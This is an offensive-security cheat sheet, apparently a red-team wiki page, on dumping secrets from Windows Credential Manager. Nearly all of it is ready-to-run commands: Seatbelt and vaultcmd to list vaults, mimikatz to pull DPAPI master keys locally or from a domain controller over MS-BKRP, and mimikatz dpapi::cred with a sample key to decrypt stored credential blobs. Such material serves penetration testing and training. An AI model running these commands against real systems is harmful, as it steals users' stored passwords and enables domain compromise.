# Extracting Secrets from Windows Credential Manager

## Extracting Secrets from Windows Credential Manager [t-ad-credential_access-credential_manager_extract]

### Overview

Extracting Secrets from Windows Credential Manager


### References:

* [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

### 1.1 List secrets




**option 1: Seatbelt**

{% code overflow="wrap" %}
```bash
Seatbelt.exe WindowsVault
Seatbelt.exe WindowsCredentialFiles

```
{% endcode %}


**option 2: cmd.exe**

{% code overflow="wrap" %}
```bash
vaultcmd /list
```
{% endcode %}

### 1.2 Extract the AES128/256 encryption key




**option 1: mimikatz**

{% code overflow="wrap" %}
```bash
#locally
mimikatz !sekurlsa::dpapi

```
{% endcode %}


**option 2: mimikatz**

{% code overflow="wrap" %}
```bash
#request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP)
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

```
{% endcode %}

### 1.3 Decrypt the blobs



{% code overflow="wrap" %}
```bash
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

```
{% endcode %}

